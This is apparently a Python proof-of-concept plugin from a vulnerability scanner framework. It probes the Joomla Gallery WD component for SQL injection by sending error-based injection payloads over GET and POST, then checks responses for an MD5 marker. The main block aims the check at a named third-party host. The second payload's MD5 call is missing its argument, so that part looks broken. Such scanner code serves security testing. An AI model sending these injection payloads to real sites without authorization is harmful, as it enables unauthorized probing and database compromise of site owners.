from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : Joomla Gallery WD SQL Injection 
From : http://cxsecurity.com/issue/WLB-2015030203
"""



class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payloads = (
            "index.php?option=com_gallery_wd&view=gallerybox&image_id=19&gallery_id=2&theme_id=1%20AND%20(SELECT%206173%20FROM(SELECT%20COUNT(*),CONCAT(0x716b627871,(MID((IFNULL(CAST(MD5(3.14)%20AS%20CHAR),0x20)),1,50)),0x716a6a7171,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)",
            "index.php?option=com_gallery_wd&view=gallerybox&image_id=19&gallery_id=2",
        )
        post = "image_id=19%20AND%20(SELECT%206173%20FROM(SELECT%20COUNT(*),CONCAT(0x716b627871,(MID((IFNULL(CAST(MD5()%20AS%20CHAR),0x20)),1,50)),0x716a6a7171,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)&rate=&ajax_task=save_hit_count&task=gallerybox.ajax_search"
        for payload in payloads:
            target = arg + payload
            code, head, res1, _, _ = curl.curl("%s" % target)
            code, head, res2, _, _ = curl.curl("-d %s %s" % (post, target))
            if code == 200 and '4beed3b9c4a886067de0e3a094246f78' in res1:
                output(target,result,'hole')
            elif code == 200 and '4beed3b9c4a886067de0e3a094246f78' in res2:
                output(target,result,'hole')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  joomla  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='joomla Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/joomla/joomla_bce7494fb568f157454c46c1f826e39e.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/joomla/joomla_bce7494fb568f157454c46c1f826e39e.py
#/root/github/poccreate/codesrc/exp-557.py